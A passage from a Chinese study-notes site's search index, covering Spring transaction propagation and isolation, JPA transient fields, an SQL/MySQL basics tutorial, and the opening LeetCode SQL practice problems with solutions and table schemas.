的增强或通知(Advice)使用到了适配器模式、spring MVC 中也是用到了适配器模式适配Controller。 \u0026hellip;\u0026hellip;  Spring 事务    Spring/SpringBoot 模块下专门有一篇是讲 Spring 事务的，总结的非常详细，通俗易懂。\nSpring 管理事务的方式有几种？     编程式事务 ： 在代码中硬编码(不推荐使用) : 通过 TransactionTemplate或者 TransactionManager 手动管理事务，实际应用中很少使用，但是对于你理解 Spring 事务管理原理有帮助。 声明式事务 ： 在 XML 配置文件中配置或者直接基于注解（推荐使用） : 实际是通过 AOP 实现（基于@Transactional 的全注解方式使用最多）  Spring 事务中哪几种事务传播行为?    事务传播行为是为了解决业务层方法之间互相调用的事务问题。\n当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。\n正确的事务传播行为可能的值如下:\n1.TransactionDefinition.PROPAGATION_REQUIRED\n使用的最多的一个事务传播行为，我们平时经常使用的@Transactional注解默认使用就是这个事务传播行为。如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。\n2.TransactionDefinition.PROPAGATION_REQUIRES_NEW\n创建一个新的事务，如果当前存在事务，则把当前事务挂起。也就是说不管外部方法是否开启事务，Propagation.REQUIRES_NEW修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。\n3.TransactionDefinition.PROPAGATION_NESTED\n如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于TransactionDefinition.PROPAGATION_REQUIRED。\n4.TransactionDefinition.PROPAGATION_MANDATORY\n如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。（mandatory：强制性）\n这个使用的很少。\n若是错误的配置以下 3 种事务传播行为，事务将不会发生回滚：\n TransactionDefinition.PROPAGATION_SUPPORTS: 如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。 TransactionDefinition.PROPAGATION_NOT_SUPPORTED: 以非事务方式运行，如果当前存在事务，则把当前事务挂起。 TransactionDefinition.PROPAGATION_NEVER: 以非事务方式运行，如果当前存在事务，则抛出异常。  Spring 事务中的隔离级别有哪几种?    和事务传播行为这块一样，为了方便使用，Spring 也相应地定义了一个枚举类：Isolation\npublic enum Isolation { DEFAULT(TransactionDefinition.ISOLATION_DEFAULT), READ_UNCOMMITTED(TransactionDefinition.ISOLATION_READ_UNCOMMITTED), READ_COMMITTED(TransactionDefinition.ISOLATION_READ_COMMITTED), REPEATABLE_READ(TransactionDefinition.ISOLATION_REPEATABLE_READ), SERIALIZABLE(TransactionDefinition.ISOLATION_SERIALIZABLE); private final int value; Isolation(int value) { this.value = value; } public int value() { return this.value; } } 下面我依次对每一种事务隔离级别进行介绍：\n TransactionDefinition.ISOLATION_DEFAULT :使用后端数据库默认的隔离级别，MySQL 默认采用的 REPEATABLE_READ 隔离级别 Oracle 默认采用的 READ_COMMITTED 隔离级别. TransactionDefinition.ISOLATION_READ_UNCOMMITTED :最低的隔离级别，使用这个隔离级别很少，因为它允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读 TransactionDefinition.ISOLATION_READ_COMMITTED : 允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生 TransactionDefinition.ISOLATION_REPEATABLE_READ : 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。 TransactionDefinition.ISOLATION_SERIALIZABLE : 最高的隔离级别，完全服从 ACID 的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。但是这将严重影响程序的性能。通常情况下也不会用到该级别。  @Transactional(rollbackFor = Exception.class)注解了解吗？    Exception 分为运行时异常 RuntimeException 和非运行时异常。事务管理对于企业应用来说是至关重要的，即使出现异常情况，它也可以保证数据的一致性。\n当 @Transactional 注解作用于类上时，该类的所有 public 方法将都具有该类型的事务属性，同时，我们也可以在方法级别使用该标注来覆盖类级别的定义。如果类或者方法加了这个注解，那么这个类里面的方法抛出异常，就会回滚，数据库里面的数据也会回滚。\n在 @Transactional 注解中如果不配置rollbackFor属性,那么事务只会在遇到RuntimeException的时候才会回滚，加上 rollbackFor=Exception.class,可以让事务在遇到非运行时异常时也回滚。\nJPA    如何使用 JPA 在数据库中非持久化一个字段？    假如我们有下面一个类：\n@Entity(name=\u0026#34;USER\u0026#34;) public class User { @Id @GeneratedValue(strategy = GenerationType.AUTO) @Column(name = \u0026#34;ID\u0026#34;) private Long id; @Column(name=\u0026#34;USER_NAME\u0026#34;) private String userName; @Column(name=\u0026#34;PASSWORD\u0026#34;) private String password; private String secrect; } 如果我们想让secrect 这个字段不被持久化，也就是不被数据库存储怎么办？我们可以采用下面几种方法：\nstatic String transient1; // not persistent because of static final String transient2 = \u0026#34;Satish\u0026#34;; // not persistent because of final transient String transient3; // not persistent because of transient @Transient String transient4; // not persistent because of @Transient 一般使用后面两种方式比较多，我个人使用注解的方式比较多。\n参考     《Spring 技术内幕》 http://www.cnblogs.com/wmyskxz/p/8820371.html https://www.journaldev.com/2696/spring-interview-questions-and-answers https://www.edureka.co/blog/interview-questions/spring-interview-questions/ https://www.cnblogs.com/clwydjgs/p/9317849.html https://howtodoinjava.com/interview-questions/top-spring-interview-questions-with-answers/ http://www.tomaszezula.com/2014/02/09/spring-series-part-5-component-vs-bean/ https://stackoverflow.com/questions/34172888/difference-between-bean-and-autowired  "},{"id":307,"href":"/%E7%AC%94%E8%AE%B0/SQL/","title":"SQL","parent":"笔记","content":" 一、基础 二、创建表 三、修改表 四、插入 五、更新 六、删除 七、查询  DISTINCT LIMIT   八、排序 九、过滤 十、通配符 十一、计算字段 十二、函数  汇总 文本处理 日期和时间处理 数值处理   十三、分组 十四、子查询 十五、连接  内连接 自连接 自然连接 外连接   十六、组合查询 十七、视图 十八、存储过程 十九、游标 二十、触发器 二十一、事务管理 二十二、字符集 二十三、权限管理 参考资料  一、基础    模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。\n主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。\nSQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。\nSQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。\nSQL 支持以下三种注释：\n# 注释 SELECT * FROM mytable; -- 注释 /* 注释1 注释2 */ 数据库创建与使用：\nCREATE DATABASE test; USE test; 二、创建表    CREATE TABLE mytable ( # int 类型，不为空，自增 id INT NOT NULL AUTO_INCREMENT, # int 类型，不可为空，默认值为 1，不为空 col1 INT NOT NULL DEFAULT 1, # 变长字符串类型，最长为 45 个字符，可以为空 col2 VARCHAR(45) NULL, # 日期类型，可为空 col3 DATE NULL, # 设置主键为 id PRIMARY KEY (`id`)); 三、修改表    添加列\nALTER TABLE mytable ADD col CHAR(20); 删除列\nALTER TABLE mytable DROP COLUMN col; 删除表\nDROP TABLE mytable; 四、插入    普通插入\nINSERT INTO mytable(col1, col2) VALUES(val1, val2); 插入检索出来的数据\nINSERT INTO mytable1(col1, col2) SELECT col1, col2 FROM mytable2; 将一个表的内容插入到一个新表\nCREATE TABLE newtable AS SELECT * FROM mytable; 五、更新    UPDATE mytable SET col = val WHERE id = 1; 六、删除    DELETE FROM mytable WHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。\nTRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。\n七、查询    DISTINCT    相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。\nSELECT DISTINCT col1, col2 FROM mytable; LIMIT    限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。\n返回前 5 行：\nSELECT * FROM mytable LIMIT 5; SELECT * FROM mytable LIMIT 0, 5; 返回第 3 ~ 5 行：\nSELECT * FROM mytable LIMIT 2, 3; 八、排序     ASC ：升序（默认） DESC ：降序  可以按多个列进行排序，并且为每个列指定不同的排序方式：\nSELECT * FROM mytable ORDER BY col1 DESC, col2 ASC; 九、过滤    不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。\nSELECT * FROM mytable WHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符\n   操作符 说明     = 等于   \u0026lt; 小于   \u0026gt; 大于   \u0026lt;\u0026gt; != 不等于   \u0026lt;= !\u0026gt; 小于等于   \u0026gt;= !\u0026lt; 大于等于   BETWEEN 在两个值之间   IS NULL 为 NULL 值    应该注意到，NULL 与 0、空字符串都不同。\nAND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。\nIN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。\nNOT 操作符用于否定一个条件。\n十、通配符    通配符也是用在过滤语句中，但它只能用于文本字段。\n  % 匹配 \u0026gt;=0 个任意字符；\n  _ 匹配 ==1 个任意字符；\n   可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。\n  使用 Like 来进行通配符匹配。\nSELECT * FROM mytable WHERE col LIKE \u0026#39;[^AB]%\u0026#39;; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。\n十一、计算字段    在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。\n计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。\nSELECT col1 * col2 AS alias FROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。\nSELECT CONCAT(TRIM(col1), \u0026#39;(\u0026#39;, TRIM(col2), \u0026#39;)\u0026#39;) AS concat_col FROM mytable; 十二、函数    各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。\n汇总       函 数 说 明     AVG() 返回某列的平均值   COUNT() 返回某列的行数   MAX() 返回某列的最大值   MIN() 返回某列的最小值   SUM() 返回某列值之和    AVG() 会忽略 NULL 行。\n使用 DISTINCT 可以汇总不同的值。\nSELECT AVG(DISTINCT col1) AS avg_col FROM mytable; 文本处理       函数 说明     LEFT() 左边的字符   RIGHT() 右边的字符   LOWER() 转换为小写字符   UPPER() 转换为大写字符   LTRIM() 去除左边的空格   RTRIM() 去除右边的空格   LENGTH() 长度   SOUNDEX() 转换为语音值    其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。\nSELECT * FROM mytable WHERE SOUNDEX(col1) = SOUNDEX(\u0026#39;apple\u0026#39;) 日期和时间处理     日期格式：YYYY-MM-DD 时间格式：HH:\u0026lt;zero-width space\u0026gt;MM:SS     函 数 说 明     ADDDATE() 增加一个日期（天、周等）   ADDTIME() 增加一个时间（时、分等）   CURDATE() 返回当前日期   CURTIME() 返回当前时间   DATE() 返回日期时间的日期部分   DATEDIFF() 计算两个日期之差   DATE_ADD() 高度灵活的日期运算函数   DATE_FORMAT() 返回一个格式化的日期或时间串   DAY() 返回一个日期的天数部分   DAYOFWEEK() 对于一个日期，返回对应的星期几   HOUR() 返回一个时间的小时部分   MINUTE() 返回一个时间的分钟部分   MONTH() 返回一个日期的月份部分   NOW() 返回当前日期和时间   SECOND() 返回一个时间的秒部分   TIME() 返回一个日期时间的时间部分   YEAR() 返回一个日期的年份部分    mysql\u0026gt; SELECT NOW(); 2018-4-14 20:25:11 数值处理       函数 说明     SIN() 正弦   COS() 余弦   TAN() 正切   ABS() 绝对值   SQRT() 平方根   MOD() 余数   EXP() 指数   PI() 圆周率   RAND() 随机数    十三、分组    把具有相同的数据值的行放在同一组中。\n可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。\n指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col ORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。\nSELECT col, COUNT(*) AS num FROM mytable WHERE col \u0026gt; 2 GROUP BY col HAVING num \u0026gt;= 2; 分组规定：\n GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。  十四、子查询    子查询中只能返回一个字段的数据。\n可以将子查询的结果作为 WHRER 语句的过滤条件：\nSELECT * FROM mytable1 WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：\nSELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_num FROM Customers ORDER BY cust_name; 十五、连接    连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。\n连接可以替换子查询，并且比子查询的效率一般会更快。\n可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。\n内连接    内连接又称等值连接，使用 INNER JOIN 关键字。\nSELECT A.value, B.value FROM tablea AS A INNER JOIN tableb AS B ON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。\nSELECT A.value, B.value FROM tablea AS A, tableb AS B WHERE A.key = B.key; 自连接    自连接可以看成内连接的一种，只是连接的表是自身而已。\n一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。\n子查询版本\nSELECT name FROM employee WHERE department = ( SELECT department FROM employee WHERE name = \u0026#34;Jim\u0026#34;); 自连接版本\nSELECT e1.name FROM employee AS e1 INNER JOIN employee AS e2 ON e1.department = e2.department AND e2.name = \u0026#34;Jim\u0026#34;; 自然连接    自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。\n内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。\nSELECT A.value, B.value FROM tablea AS A NATURAL JOIN tableb AS B; 外连接    外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。\n检索所有顾客的订单信息，包括还没有订单信息的顾客。\nSELECT Customers.cust_id, Customer.cust_name, Orders.order_id FROM Customers LEFT OUTER JOIN Orders ON Customers.cust_id = Orders.cust_id; customers 表：\n   cust_id cust_name     1 a   2 b   3 c    orders 表：\n   order_id cust_id     1 1   2 1   3 3   4 3    结果：\n   cust_id cust_name order_id     1 a 1   1 a 2   3 c 3   3 c 4   2 b Null    十六、组合查询    使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。\n每个查询必须包含相同的列、表达式和聚集函数。\n默认会去除相同行，如果需要保留相同行，使用 UNION ALL。\n只能包含一个 ORDER BY 子句，并且必须位于语句的最后。\nSELECT col FROM mytable WHERE col = 1 UNION SELECT col FROM mytable WHERE col =2; 十七、视图    视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。\n对视图的操作和对普通表的操作一样。\n视图具有如下好处：\n 简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。  CREATE VIEW myview AS SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col FROM mytable WHERE col5 = val; 十八、存储过程    存储过程可以看成是对一系列 SQL 操作的批处理。\n使用存储过程的好处：\n 代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。  命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。\n包含 in、out 和 inout 三种参数。\n给变量赋值都需要用 select into 语句。\n每次只能给一个变量赋值，不支持集合的操作。\ndelimiter // create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end // delimiter ; call myprocedure(@ret); select @ret; 十九、游标    在存储过程中使用游标可以对一个结果集进行移动遍历。\n游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。\n使用游标的四个步骤：\n 声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标；  delimiter // create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # 定义了一个 continue handler，当 sqlstate \u0026#39;02000\u0026#39; 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate \u0026#39;02000\u0026#39; set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 二十、触发器    触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。\n触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。\nINSERT 触发器包含一个名为 NEW 的虚拟表。\nCREATE TRIGGER mytrigger AFTER INSERT ON mytable FOR EACH ROW SELECT NEW.col into @result; SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。\nUPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。\nMySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。\n二十一、事务管理    基本术语：\n 事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。  不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。\nMySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。\n设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。\n如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。\nSTART TRANSACTION // ... SAVEPOINT delete1 // ... ROLLBACK TO delete1 // ... COMMIT 二十二、字符集    基本术语：\n 字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。  除了给表指定字符集和校对外，也可以给列指定：\nCREATE TABLE mytable (col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci ) DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对：\nSELECT * FROM mytable ORDER BY col COLLATE latin1_general_ci; 二十三、权限管理    MySQL 的账户信息保存在 mysql 这个数据库中。\nUSE mysql; SELECT user FROM user; 创建账户\n新创建的账户没有任何权限。\nCREATE USER myuser IDENTIFIED BY \u0026#39;mypassword\u0026#39;; 修改账户名\nRENAME USER myuser TO newuser; 删除账户\nDROP USER myuser; 查看权限\nSHOW GRANTS FOR myuser; 授予权限\n账户用 username@host 的形式定义，username@% 使用的是默认主机名。\nGRANT SELECT, INSERT ON mydatabase.* TO myuser; 删除权限\nGRANT 和 REVOKE 可在几个层次上控制访问权限：\n 整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。  REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; 更改密码\n必须使用 Password() 函数进行加密。\nSET PASSWROD FOR myuser = Password(\u0026#39;new_password\u0026#39;); 参考资料     BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.  "},{"id":308,"href":"/%E7%AC%94%E8%AE%B0/SQLSQL-%E7%BB%83%E4%B9%A0/","title":"SQL 练习","parent":"笔记","content":"SQL 练习     SQL 练习  595. Big Countries 627. Swap Salary 620. Not Boring Movies 596. Classes More Than 5 Students 182. Duplicate Emails 196. Delete Duplicate Emails 175. Combine Two Tables 181. Employees Earning More Than Their Managers 183. Customers Who Never Order 184. Department Highest Salary 176. Second Highest Salary 177. Nth Highest Salary 178. Rank Scores 180. Consecutive Numbers 626. Exchange Seats    595. Big Countries    https://leetcode.com/problems/big-countries/description/\nDescription    +-----------------+------------+------------+--------------+---------------+ | name | continent | area | population | gdp | +-----------------+------------+------------+--------------+---------------+ | Afghanistan | Asia | 652230 | 25500100 | 20343000 | | Albania | Europe | 28748 | 2831741 | 12960000 | | Algeria | Africa | 2381741 | 37100000 | 188681000 | | Andorra | Europe | 468 | 78115 | 3712000 | | Angola | Africa | 1246700 | 20609294 | 100990000 | +-----------------+------------+------------+--------------+---------------+ 查找面积超过 3,000,000 或者人口数超过 25,000,000 的国家。\n+--------------+-------------+--------------+ | name | population | area | +--------------+-------------+--------------+ | Afghanistan | 25500100 | 652230 | | Algeria | 37100000 | 2381741 | +--------------+-------------+--------------+ Solution    SELECT name, population, area FROM World WHERE area \u0026gt; 3000000 OR population \u0026gt; 25000000; SQL Schema    SQL Schema 用于在本地环境下创建表结构并导入数据，从而方便在本地环境调试。\nDROP TABLE IF EXISTS World; CREATE TABLE World ( NAME VARCHAR ( 255 ), continent VARCHAR ( 255 ), area INT, population INT, gdp INT ); INSERT INTO World ( NAME, continent, area, population, gdp ) VALUES ( \u0026#39;Afghanistan\u0026#39;, \u0026#39;Asia\u0026#39;, \u0026#39;652230\u0026#39;, \u0026#39;25500100\u0026#39;, \u0026#39;203430000\u0026#39; ), ( \u0026#39;Albania\u0026#39;, \u0026#39;Europe\u0026#39;, \u0026#39;28748\u0026#39;, \u0026#39;2831741\u0026#39;, \u0026#39;129600000\u0026#39; ), ( \u0026#39;Algeria\u0026#39;, \u0026#39;Africa\u0026#39;, \u0026#39;2381741\u0026#39;, \u0026#39;37100000\u0026#39;, \u0026#39;1886810000\u0026#39; ), ( \u0026#39;Andorra\u0026#39;, \u0026#39;Europe\u0026#39;, \u0026#39;468\u0026#39;, \u0026#39;78115\u0026#39;, \u0026#39;37120000\u0026#39; ), ( \u0026#39;Angola\u0026#39;, \u0026#39;Africa\u0026#39;, \u0026#39;1246700\u0026#39;, \u0026#39;20609294\u0026#39;, \u0026#39;1009900000\u0026#39; ); 627. Swap Salary    https://leetcode.com/problems/swap-salary/description/\nDescription    | id | name | sex | salary | |----|------|-----|--------| | 1 | A | m | 2500 | | 2 | B | f | 1500 | | 3 | C | m | 5500 | | 4 | D | f | 500 | 只用一个 SQL 查询，将 sex 字段反转。\n| id | name | sex | salary | |----|------|-----|--------| | 1 | A | f | 2500 | | 2 | B | m | 1500 | | 3 | C | f | 5500 | | 4 | D | m | 500 | Solution    两个相等的数异或的结果为 0，而 0 与任何一个数异或的结果为这个数。\nsex 字段只有两个取值：\u0026lsquo;f\u0026rsquo; 和 \u0026rsquo;m'，并且有以下规律：\n'f' ^ ('m' ^ 'f') = 'm' ^ ('f' ^ 'f') = 'm' 'm' ^ ('m' ^ 'f') = 'f' ^ ('m' ^ 'm') = 'f' 因此将 sex 字段和 \u0026rsquo;m' ^ \u0026lsquo;f\u0026rsquo; 进行异或操作，最后就能反转 sex 字段。\nUPDATE salary SET sex = CHAR ( ASCII(sex) ^ ASCII( \u0026#39;m\u0026#39; ) ^ ASCII( \u0026#39;f\u0026#39; ) ); SQL Schema    DROP TABLE IF EXISTS salary; CREATE TABLE salary ( id INT, NAME VARCHAR ( 100 ), sex CHAR ( 1 ), salary INT ); INSERT INTO salary ( id, NAME, sex, salary ) VALUES ( \u0026#39;1\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;2500\u0026#39; ), ( \u0026#39;2\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;1500\u0026#39; ), ( \u0026#39;3\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;5500\u0026#39; ), ( \u0026#39;4\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;500\u0026#39; ); 620. Not Boring Movies    https://leetcode.com/problems/not-boring-movies/description/\nDescription    +---------+-----------+--------------+-----------+ | id | movie | description | rating | +---------+-----------+--------------+-----------+ | 1 | War | great 3D | 8.9 | | 2 | Science | fiction | 8.5 | | 3 | irish | boring | 6.2 | | 4 | Ice song | Fantacy | 8.6 | | 5 | House card| Interesting| 9.1 | +---------+-----------+--------------+-----------+ 查找 id 为奇数，并且 description 不是 boring 的电影，按 rating 降序。\n+---------+-----------+--------------+-----------+ | id | movie | description | rating | +---------+-----------+--------------+-----------+ | 5 | House card| Interesting| 9.1 | | 1 | War | great 3D | 8.9 | +---------+-----------+--------------+-----------+ Solution    SELECT * FROM cinema WHERE id % 2 = 1 AND description != \u0026#39;boring\u0026#39; ORDER BY rating DESC; SQL Schema    DROP TABLE IF EXISTS cinema; CREATE TABLE cinema ( id INT, movie VARCHAR ( 255 ), description VARCHAR ( 255 ), rating FLOAT ( 2, 1 ) ); INSERT INTO cinema ( id, movie, description, rating ) VALUES ( 1, \u0026#39;War\u0026#39;, \u0026#39;great 3D\u0026#39;, 8.9 ), ( 2, \u0026#39;Science\u0026#39;, \u0026#39;fiction\u0026#39;, 8.5 ), ( 3, \u0026#39;irish\u0026#39;, \u0026#39;boring\u0026#39;, 6.2 ), ( 4, \u0026#39;Ice song\u0026#39;, \u0026#39;Fantacy\u0026#39;, 8.6 ), ( 5, \u0026#39;House card\u0026#39;, \u0026#39;Interesting\u0026#39;, 9.1 ); 596. Classes More Than 5 Students    https://leetcode.com/problems/classes-more-than-5-students/description/\nDescription    +---------+------------+ | student | class | +---------+------------+ | A | Math | | B | English | | C | Math | | D | Biology | | E | Math | | F | Computer | | G | Math | | H | Math | | I | Math | +---------+------------+ 查找有五名及以上 student 的 class。\n+---------+ | class | +---------+ | Math | +---------+ Solution    对 class 列进行分组之后，再使用 count 汇总函数统计每个分组的记录个数，之后使用 HAVING 进行筛选。HAVING 针对分组进行筛选，而 WHERE 针对每个记录（行）进行筛选。\nSELECT class FROM courses GROUP BY class HAVING count( DISTINCT student ) \u0026gt;= 5; SQL Schema    DROP TABLE IF EXISTS courses; CREATE TABLE courses ( student VARCHAR ( 255 ), class VARCHAR ( 255 ) ); INSERT INTO courses ( student, class ) VALUES ( \u0026#39;A\u0026#39;, \u0026#39;Math\u0026#39; ), ( \u0026#39;B\u0026#39;, \u0026#39;English\u0026#39; ), ( \u0026#39;C\u0026#39;, \u0026#39;Math\u0026#39; ), ( \u0026#39;D\u0026#39;, \u0026#39;Biology\u0026#39; ), ( \u0026#39;E\u0026#39;, \u0026#39;Math\u0026#39; ), ( \u0026#39;F\u0026#39;, \u0026#39;Computer\u0026#39; ), ( \u0026#39;G\u0026#39;, \u0026#39;Math\u0026#39; ), ( \u0026#39;H\u0026#39;, \u0026#39;Math\u0026#39; ), ( \u0026#39;I\u0026#39;, \u0026#39;Math\u0026#39; ); 182. Duplicate Emails    https://leetcode.com/problems/duplicate-emails/description/\nDescription    邮件地址表：\n+----+---------+ | Id | Email | +----+---------+ | 1 | a@b.com | | 2 | c@d.com | | 3 | a@b.com | +----+---------+ 查找重复的邮件地址：\n+---------+ | Email | +---------+ | a@b.com | +---------+ Solution    对 Email 进行分组，如果并使用 COUNT 进行计数统计，结果大于等于 2 的表示 Email 重复。\nSELECT Email FROM Person GROUP BY Email HAVING COUNT( * ) \u0026gt;= 2; SQL Schema    DROP TABLE IF EXISTS Person; CREATE TABLE Person ( Id INT, Email VARCHAR ( 255 ) ); INSERT INTO Person ( Id, Email ) VALUES ( 1, \u0026#39;a@b.com\u0026#39; ), ( 2, \u0026#39;c@d.com\u0026#39; ), ( 3, \u0026#39;a@b.com\u0026#39; ); 196. Delete Duplicate Emails    https://leetcode.com/problems/delete-duplicate-emails/description/\nDescription    邮件地址表：\n+----+---------+ | Id | Email | +----+---------+ | 1 | john@example.com | | 2 | bob@example.com | | 3 | john@example.com | +----+---------+ 删除重复的邮件地址：\n+----+------------------+ | Id | Email | +----+------------------+ | 1 | john@example.com | | 2 | bob@example.com | +----+------------------+ Solution    只保留相同 Email 中 Id 最小的那一个，然后删除其它的。\n连接查询：\nDELETE p1 FROM Person p1, Person p2 WHERE p1.Email = p2.Email AND p1.Id \u0026gt; p2.Id 子查询：\nDELETE FROM Person WHERE id NOT IN ( SELECT id FROM ( SELECT min( id ) AS id FROM Person GROUP BY email ) AS m ); 应该注意的是上述解法额外嵌套了一个 SELECT 语句，如果不这么做，会出现错误：You can\u0026rsquo;t specify target table \u0026lsquo;Person\u0026rsquo; for update in FROM clause。以下演示了这种错误解法。\nDELETE FROM Person WHERE id NOT IN ( SELECT min( id ) AS id FROM Person GROUP BY email ); 参考：pMySQL Error 1093 - Can\u0026rsquo;t specify target table for update in FROM clause\nSQL Schema    与 182 相同。\n175. Combine Two Tables    https://leetcode.com/problems/combine-two-tables/description/\nDescription    Person 表：\n+-------------+---------+ | Column Name | Type | +-------------+---------+ | PersonId | int | | FirstName | varchar | | LastName | varchar | +-------------+---------+ PersonId is the primary key column for this table. Address 表：\n+-------------+---------+ | Column Name | Type | +-------------+---------+ | AddressId | int | | PersonId | int | | City | 